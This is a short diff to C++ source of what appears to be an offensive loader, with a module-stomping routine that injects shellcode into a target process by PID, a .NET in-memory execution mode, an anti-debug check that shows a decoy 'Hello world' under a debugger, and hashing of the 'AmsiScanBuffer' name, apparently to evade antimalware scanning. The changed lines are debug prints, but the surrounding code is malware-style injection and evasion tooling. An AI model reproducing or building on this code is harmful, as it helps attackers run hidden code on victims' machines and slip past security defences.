@@ -171,7 +171,7 @@ void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
 }
 //debug antiDebug;
 int main(int argc, char* argv[]) {
-	
+	std::cout << "AmsiScanBuffer" << helperHandler.simpleHash("AmsiScanBuffer") << "\n";
     if (antiDebug.checkDebug()) {
         std::cout << "Hello world !!!";
         return 0;
@@ -180,8 +180,9 @@ int main(int argc, char* argv[]) {
     try {
         helper::Options opt = helperHandler.parseArgs(argc, argv);
 
-        std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
+        //std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
         if (opt.mode == "dotnet") {
+            std::wcout << "Parsed options - path: " << opt.filePath << ", args: " << opt.args << "\n";
             InitDotnet(opt.filePath, false, opt.args);
             return 0;
         }
@@ -242,7 +243,8 @@ int main(int argc, char* argv[]) {
                 shellcode,
                 shellcode_len);
         }
-
+        std::cout << "Press Enter to exit...";
+        std::cin.get();
         return 0;
     }
     catch (const std::exception& e) {
